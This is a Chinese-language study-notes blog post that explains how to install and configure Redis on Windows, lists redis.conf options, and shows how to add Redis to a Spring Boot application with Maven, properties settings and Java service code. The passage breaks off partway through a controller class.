        <content type="html"><![CDATA[<h1 id="Spring-Boot-学习笔记-08"><a href="#Spring-Boot-学习笔记-08" class="headerlink" title="Spring Boot 学习笔记 08"></a>Spring Boot 学习笔记 08</h1><h2 id="0x01-Redis数据库的安装和配置"><a href="#0x01-Redis数据库的安装和配置" class="headerlink" title="0x01  Redis数据库的安装和配置"></a>0x01  Redis数据库的安装和配置</h2><p><strong>安装：</strong><br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/tporadowski/redis/releases%E3%80%82">https://github.com/tporadowski/redis/releases。</a></p><p>Redis 支持 32 位和 64 位。这个需要根据你系统平台的实际情况选择，这里我们下载 Redis-x64-xxx.zip压缩包到 C 盘，解压后，将文件夹重新命名为 redis。</p><p>打开一个 cmd 窗口 使用 cd 命令切换目录到 C:\redis 运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server.exe redis.windows.conf</span><br></pre></td></tr></table></figure><p>如果想方便的话，可以把 redis 的路径加到系统的环境变量里，这样就省得再输路径了，后面的那个 redis.windows.conf 可以省略，如果省略，会启用默认的。输入之后，会显示如下界面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[23520] 30 Jul 20:12:27.585 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">[23520] 30 Jul 20:12:27.585 # Redis version=5.0.10, bits=64, commit=1c047b68, modified=0, pid=23520, just started</span><br><span class="line">[23520] 30 Jul 20:12:27.585 # Configuration loaded</span><br><span class="line">                _._</span><br><span class="line">           _.-``__ &#x27;&#x27;-._</span><br><span class="line">      _.-``    `.  `_.  &#x27;&#x27;-._           Redis 5.0.10 (1c047b68/0) 64 bit</span><br><span class="line">  .-`` .-```.  ```\/    _.,_ &#x27;&#x27;-._</span><br><span class="line"> (    &#x27;      ,       .-`  | `,    )     Running in standalone mode</span><br><span class="line"> |`-._`-...-` __...-.``-._|&#x27;` _.-&#x27;|     Port: 6379</span><br><span class="line"> |    `-._   `._    /     _.-&#x27;    |     PID: 23520</span><br><span class="line">  `-._    `-._  `-./  _.-&#x27;    _.-&#x27;</span><br><span class="line"> |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|</span><br><span class="line"> |    `-._`-._        _.-&#x27;_.-&#x27;    |           http://redis.io</span><br><span class="line">  `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;</span><br><span class="line"> |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|</span><br><span class="line"> |    `-._`-._        _.-&#x27;_.-&#x27;    |</span><br><span class="line">  `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;</span><br><span class="line">      `-._    `-.__.-&#x27;    _.-&#x27;</span><br><span class="line">          `-._        _.-&#x27;</span><br><span class="line">              `-.__.-&#x27;</span><br><span class="line"></span><br><span class="line">[23520] 30 Jul 20:12:27.588 # Server initialized</span><br><span class="line">[23520] 30 Jul 20:12:27.588 * Ready to accept connections</span><br></pre></td></tr></table></figure><p><strong>配置：</strong><br>Redis 的配置文件位于 Redis 安装目录下，文件名为 redis.conf(Windows 名为 redis.windows.conf)。</p><p>你可以通过 CONFIG 命令查看或设置配置项。</p><p>语法<br>Redis CONFIG 命令格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; CONFIG GET CONFIG_SETTING_NAME</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; CONFIG GET loglevel</span><br><span class="line"></span><br><span class="line">1) &quot;loglevel&quot;</span><br><span class="line">2) &quot;notice&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 * 号获取所有配置项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; CONFIG GET *</span><br><span class="line"></span><br><span class="line">  1) &quot;dbfilename&quot;</span><br><span class="line">  2) &quot;dump.rdb&quot;</span><br><span class="line">  3) &quot;requirepass&quot;</span><br><span class="line">  4) &quot;&quot;</span><br><span class="line">  5) &quot;masterauth&quot;</span><br><span class="line">  6) &quot;&quot;</span><br><span class="line">  7) &quot;unixsocket&quot;</span><br><span class="line">  8) &quot;&quot;</span><br><span class="line">  9) &quot;logfile&quot;</span><br><span class="line"> 10) &quot;&quot;</span><br><span class="line"> 11) &quot;pidfile&quot;</span><br><span class="line"> 12) &quot;/var/run/redis.pid&quot;</span><br><span class="line"> 13) &quot;maxmemory&quot;</span><br><span class="line"> 14) &quot;0&quot;</span><br><span class="line"> 15) &quot;maxmemory-samples&quot;</span><br><span class="line"> 16) &quot;3&quot;</span><br><span class="line"> 17) &quot;timeout&quot;</span><br><span class="line"> 18) &quot;0&quot;</span><br><span class="line"> 19) &quot;tcp-keepalive&quot;</span><br><span class="line"> 20) &quot;0&quot;</span><br><span class="line"> 21) &quot;auto-aof-rewrite-percentage&quot;</span><br><span class="line"> 22) &quot;100&quot;</span><br><span class="line"> 23) &quot;auto-aof-rewrite-min-size&quot;</span><br><span class="line"> 24) &quot;67108864&quot;</span><br><span class="line"> 25) &quot;hash-max-ziplist-entries&quot;</span><br><span class="line"> 26) &quot;512&quot;</span><br><span class="line"> 27) &quot;hash-max-ziplist-value&quot;</span><br><span class="line"> 28) &quot;64&quot;</span><br><span class="line"> 29) &quot;list-max-ziplist-entries&quot;</span><br><span class="line"> 30) &quot;512&quot;</span><br><span class="line"> 31) &quot;list-max-ziplist-value&quot;</span><br><span class="line"> 32) &quot;64&quot;</span><br><span class="line"> 33) &quot;set-max-intset-entries&quot;</span><br><span class="line"> 34) &quot;512&quot;</span><br><span class="line"> 35) &quot;zset-max-ziplist-entries&quot;</span><br><span class="line"> 36) &quot;128&quot;</span><br><span class="line"> 37) &quot;zset-max-ziplist-value&quot;</span><br><span class="line"> 38) &quot;64&quot;</span><br><span class="line"> 39) &quot;hll-sparse-max-bytes&quot;</span><br><span class="line"> 40) &quot;3000&quot;</span><br><span class="line"> 41) &quot;lua-time-limit&quot;</span><br><span class="line"> 42) &quot;5000&quot;</span><br><span class="line"> 43) &quot;slowlog-log-slower-than&quot;</span><br><span class="line"> 44) &quot;10000&quot;</span><br><span class="line"> 45) &quot;latency-monitor-threshold&quot;</span><br><span class="line"> 46) &quot;0&quot;</span><br><span class="line"> 47) &quot;slowlog-max-len&quot;</span><br><span class="line"> 48) &quot;128&quot;</span><br><span class="line"> 49) &quot;port&quot;</span><br><span class="line"> 50) &quot;6379&quot;</span><br><span class="line"> 51) &quot;tcp-backlog&quot;</span><br><span class="line"> 52) &quot;511&quot;</span><br><span class="line"> 53) &quot;databases&quot;</span><br><span class="line"> 54) &quot;16&quot;</span><br><span class="line"> 55) &quot;repl-ping-slave-period&quot;</span><br><span class="line"> 56) &quot;10&quot;</span><br><span class="line"> 57) &quot;repl-timeout&quot;</span><br><span class="line"> 58) &quot;60&quot;</span><br><span class="line"> 59) &quot;repl-backlog-size&quot;</span><br><span class="line"> 60) &quot;1048576&quot;</span><br><span class="line"> 61) &quot;repl-backlog-ttl&quot;</span><br><span class="line"> 62) &quot;3600&quot;</span><br><span class="line"> 63) &quot;maxclients&quot;</span><br><span class="line"> 64) &quot;4064&quot;</span><br><span class="line"> 65) &quot;watchdog-period&quot;</span><br><span class="line"> 66) &quot;0&quot;</span><br><span class="line"> 67) &quot;slave-priority&quot;</span><br><span class="line"> 68) &quot;100&quot;</span><br><span class="line"> 69) &quot;min-slaves-to-write&quot;</span><br><span class="line"> 70) &quot;0&quot;</span><br><span class="line"> 71) &quot;min-slaves-max-lag&quot;</span><br><span class="line"> 72) &quot;10&quot;</span><br><span class="line"> 73) &quot;hz&quot;</span><br><span class="line"> 74) &quot;10&quot;</span><br><span class="line"> 75) &quot;no-appendfsync-on-rewrite&quot;</span><br><span class="line"> 76) &quot;no&quot;</span><br><span class="line"> 77) &quot;slave-serve-stale-data&quot;</span><br><span class="line"> 78) &quot;yes&quot;</span><br><span class="line"> 79) &quot;slave-read-only&quot;</span><br><span class="line"> 80) &quot;yes&quot;</span><br><span class="line"> 81) &quot;stop-writes-on-bgsave-error&quot;</span><br><span class="line"> 82) &quot;yes&quot;</span><br><span class="line"> 83) &quot;daemonize&quot;</span><br><span class="line"> 84) &quot;no&quot;</span><br><span class="line"> 85) &quot;rdbcompression&quot;</span><br><span class="line"> 86) &quot;yes&quot;</span><br><span class="line"> 87) &quot;rdbchecksum&quot;</span><br><span class="line"> 88) &quot;yes&quot;</span><br><span class="line"> 89) &quot;activerehashing&quot;</span><br><span class="line"> 90) &quot;yes&quot;</span><br><span class="line"> 91) &quot;repl-disable-tcp-nodelay&quot;</span><br><span class="line"> 92) &quot;no&quot;</span><br><span class="line"> 93) &quot;aof-rewrite-incremental-fsync&quot;</span><br><span class="line"> 94) &quot;yes&quot;</span><br><span class="line"> 95) &quot;appendonly&quot;</span><br><span class="line"> 96) &quot;no&quot;</span><br><span class="line"> 97) &quot;dir&quot;</span><br><span class="line"> 98) &quot;/home/deepak/Downloads/redis-2.8.13/src&quot;</span><br><span class="line"> 99) &quot;maxmemory-policy&quot;</span><br><span class="line">100) &quot;volatile-lru&quot;</span><br><span class="line">101) &quot;appendfsync&quot;</span><br><span class="line">102) &quot;everysec&quot;</span><br><span class="line">103) &quot;save&quot;</span><br><span class="line">104) &quot;3600 1 300 100 60 10000&quot;</span><br><span class="line">105) &quot;loglevel&quot;</span><br><span class="line">106) &quot;notice&quot;</span><br><span class="line">107) &quot;client-output-buffer-limit&quot;</span><br><span class="line">108) &quot;normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60&quot;</span><br><span class="line">109) &quot;unixsocketperm&quot;</span><br><span class="line">110) &quot;0&quot;</span><br><span class="line">111) &quot;slaveof&quot;</span><br><span class="line">112) &quot;&quot;</span><br><span class="line">113) &quot;notify-keyspace-events&quot;</span><br><span class="line">114) &quot;&quot;</span><br><span class="line">115) &quot;bind&quot;</span><br><span class="line">116) &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>编辑配置：</strong><br>你可以通过修改 redis.conf 文件或使用 CONFIG set 命令来修改配置。</p><p>语法:<br>CONFIG SET 命令基本语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; CONFIG SET loglevel &quot;notice&quot;</span><br><span class="line">OK</span><br><span class="line">redis 127.0.0.1:6379&gt; CONFIG GET loglevel</span><br><span class="line"></span><br><span class="line">1) &quot;loglevel&quot;</span><br><span class="line">2) &quot;notice&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参数说明<br>redis.conf 配置项说明如下：</p><table><thead><tr><th>序号</th><th>配置项</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>daemonize no</td><td>Redis 默认不是以守护进程的方式运行，可以通过该配置项修改，使用 yes 启用守护进程（Windows 不支持守护线程的配置为 no ）</td></tr><tr><td>2</td><td>pidfile &#x2F;var&#x2F;run&#x2F;redis.pid</td><td>当 Redis 以守护进程方式运行时，Redis 默认会把 pid 写入 &#x2F;var&#x2F;run&#x2F;redis.pid 文件，可以通过 pidfile 指定</td></tr><tr><td>3</td><td>port 6379</td><td>指定 Redis 监听端口，默认端口为 6379，作者在自己的一篇博文中解释了为什么选用 6379 作为默认端口，因为 6379 在手机按键上 MERZ 对应的号码，而 MERZ 取自意大利歌女 Alessia Merz 的名字</td></tr><tr><td>4</td><td>bind 127.0.0.1</td><td>绑定的主机地址</td></tr><tr><td>5</td><td>timeout 300</td><td>当客户端闲置多长秒后关闭连接，如果指定为 0 ，表示关闭该功能</td></tr><tr><td>6</td><td>loglevel notice</td><td>指定日志记录级别，Redis 总共支持四个级别：debug、verbose、notice、warning，默认为 notice</td></tr><tr><td>7</td><td>logfile stdout</td><td>日志记录方式，默认为标准输出，如果配置 Redis 为守护进程方式运行，而这里又配置为日志记录方式为标准输出，则日志将会发送给 &#x2F;dev&#x2F;null</td></tr><tr><td>8</td><td>databases 16</td><td>设置数据库的数量，默认数据库为0，可以使用SELECT 命令在连接上指定数据库id</td></tr><tr><td>9</td><td>save <seconds> <changes>Redis 默认配置文件中提供了三个条件：<br />save 900 1<br />save 300 10<br />save 60 10000<br />分别表示 900 秒（15 分钟）内有 1 个更改，300 秒（5 分钟）内有 10 个更改以及 60 秒内有 10000 个更改。</td><td>指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合</td></tr><tr><td>10</td><td>rdbcompression yes</td><td>指定存储至本地数据库时是否压缩数据，默认为 yes，Redis 采用 LZF 压缩，如果为了节省 CPU 时间，可以关闭该选项，但会导致数据库文件变的巨大</td></tr><tr><td>11</td><td>dbfilename dump.rdb</td><td>指定本地数据库文件名，默认值为 dump.rdb</td></tr><tr><td>12</td><td>dir .&#x2F;</td><td>指定本地数据库存放目录</td></tr><tr><td>13</td><td>slaveof <masterip> <masterport></td><td>设置当本机为 slave 服务时，设置 master 服务的 IP 地址及端口，在 Redis 启动时，它会自动从 master 进行数据同步</td></tr><tr><td>14</td><td>masterauth <master-password></td><td>当 master 服务设置了密码保护时，slav 服务连接 master 的密码</td></tr><tr><td>15</td><td>requirepass foobared</td><td>设置 Redis 连接密码，如果配置了连接密码，客户端在连接 Redis 时需要通过 AUTH <password> 命令提供密码，默认关闭</td></tr><tr><td>16</td><td>maxclients 128</td><td>设置同一时间最大客户端连接数，默认无限制，Redis 可以同时打开的客户端连接数为 Redis 进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis 会关闭新的连接并向客户端返回 max number of clients reached 错误信息</td></tr><tr><td>17</td><td>maxmemory <bytes></td><td>指定 Redis 最大内存限制，Redis 在启动时会把数据加载到内存中，达到最大内存后，Redis 会先尝试清除已到期或即将到期的 Key，当此方法处理 后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis 新的 vm 机制，会把 Key 存放内存，Value 会存放在 swap 区</td></tr><tr><td>18</td><td>appendonly no</td><td>指定是否在每次更新操作后进行日志记录，Redis 在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis 本身同步数据文件是按上面 save 条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为 no</td></tr><tr><td>19</td><td>appendfilename appendonly.aof</td><td>指定更新日志文件名，默认为 appendonly.aof</td></tr><tr><td>20</td><td>appendfsync everysec</td><td>指定更新日志条件，共有 3 个可选值：no：表示等操作系统进行数据缓存同步到磁盘（快）always：表示每次更新操作后手动调用 fsync() 将数据写到磁盘（慢，安全）everysec：表示每秒同步一次（折中，默认值）</td></tr><tr><td>21</td><td>vm-enabled no</td><td>指定是否启用虚拟内存机制，默认值为 no，简单的介绍一下，VM 机制将数据分页存放，由 Redis 将访问量较少的页即冷数据 swap 到磁盘上，访问多的页面由磁盘自动换出到内存中（在后面的文章我会仔细分析 Redis 的 VM 机制）</td></tr><tr><td>22</td><td>vm-swap-file &#x2F;tmp&#x2F;redis.swap</td><td>虚拟内存文件路径，默认值为 &#x2F;tmp&#x2F;redis.swap，不可多个 Redis 实例共享</td></tr><tr><td>23</td><td>vm-max-memory 0</td><td>将所有大于 vm-max-memory 的数据存入虚拟内存，无论 vm-max-memory 设置多小，所有索引数据都是内存存储的(Redis 的索引数据 就是 keys)，也就是说，当 vm-max-memory 设置为 0 的时候，其实是所有 value 都存在于磁盘。默认值为 0</td></tr><tr><td>24</td><td>vm-page-size 32</td><td>Redis swap 文件分成了很多的 page，一个对象可以保存在多个 page 上面，但一个 page 上不能被多个对象共享，vm-page-size 是要根据存储的 数据大小来设定的，作者建议如果存储很多小对象，page 大小最好设置为 32 或者 64bytes；如果存储很大大对象，则可以使用更大的 page，如果不确定，就使用默认值</td></tr><tr><td>25</td><td>vm-pages 134217728</td><td>设置 swap 文件中的 page 数量，由于页表（一种表示页面空闲或使用的 bitmap）是在放在内存中的，，在磁盘上每 8 个 pages 将消耗 1byte 的内存。</td></tr><tr><td>26</td><td>vm-max-threads 4</td><td>设置访问swap文件的线程数,最好不要超过机器的核数,如果设置为0,那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4</td></tr><tr><td>27</td><td>glueoutputbuf yes</td><td>设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启</td></tr><tr><td>28</td><td>hash-max-zipmap-entries 64<br />  hash-max-zipmap-value 512</td><td>指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法</td></tr><tr><td>29</td><td>activerehashing yes</td><td>指定是否激活重置哈希，默认为开启（后面在介绍 Redis 的哈希算法时具体介绍）</td></tr><tr><td>30</td><td>include &#x2F;path&#x2F;to&#x2F;local.conf</td><td>指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件</td></tr></tbody></table><h2 id="0x02-SpringBoot-中集成Redis"><a href="#0x02-SpringBoot-中集成Redis" class="headerlink" title="0x02 SpringBoot 中集成Redis"></a>0x02 SpringBoot 中集成Redis</h2><p>__REmote DIctionary Server(Redis) __是一个由 Salvatore Sanfilippo 写的 __key-value 存储系统__，是跨平台的__非关系型数据库__。</p><p>Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。</p><p>Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。</p><p>Redis 是__完全开源__的，遵守 BSD 协议，是一个高性能的 __key-value 数据库__。</p><p><strong>Redis 与其他 key - value 缓存产品有以下三个特点：</strong></p><ul><li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li><li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li><li>Redis支持数据的备份，即master-slave模式的数据备份。</li></ul><p><strong>Redis与其他key-value存储有什么不同？</strong></p><ul><li><p>Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。</p></li><li><p>Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。</p></li></ul><p><strong>SpringBoot 中集成Redis只有两步：</strong></p><ol><li>添加操作Redis数据类型的依赖</li><li>在SpringBoot核心配置文件中添加Redis的配置</li></ol><h3 id="0x0201-添加操作Redis数据类型的依赖"><a href="#0x0201-添加操作Redis数据类型的依赖" class="headerlink" title="0x0201 添加操作Redis数据类型的依赖"></a>0x0201 添加操作Redis数据类型的依赖</h3><p>在Maven的pom.xml中添加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringBoot集成Redis的起步依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x0202-在SpringBoot核心配置文件中添加Redis的配置"><a href="#0x0202-在SpringBoot核心配置文件中添加Redis的配置" class="headerlink" title="0x0202 在SpringBoot核心配置文件中添加Redis的配置"></a>0x0202 在SpringBoot核心配置文件中添加Redis的配置</h3><p>在application.properties中添加：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置redis配置信息</span></span><br><span class="line"><span class="attr">spring.redis.host</span>=<span class="string">127.0.0.1</span></span><br><span class="line"><span class="attr">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="comment">#没有设置密码不用填下面的</span></span><br><span class="line"><span class="attr">spring.redis.password</span>=<span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="0x0203-操作Redis"><a href="#0x0203-操作Redis" class="headerlink" title="0x0203 操作Redis"></a>0x0203 操作Redis</h3><p>在业务层创建存入Redis数据库的业务操作，在Application.java同级目录或次级目录创建包service，包内创建一个StudentService.java接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将值存放到redis中</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String key, String value)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从redis中获取指定key的值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">get</span><span class="params">(String key)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再在service包内创建一个包impl用来存放接口实现类，里面创建StudentServiceImpl.java作为上面接口的接口实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.service.StudentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;Object,Object&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String key, String value)</span> &#123;</span><br><span class="line"><span class="comment">//对数据进行存入操作set(key,value)</span></span><br><span class="line">        redisTemplate.opsForValue().set(key,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">(String key)</span> &#123;</span><br><span class="line"><span class="comment">//对数据进行取出操作get(key)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">count</span> <span class="operator">=</span> (String) redisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在控制层进行数据的输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.service.StudentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span 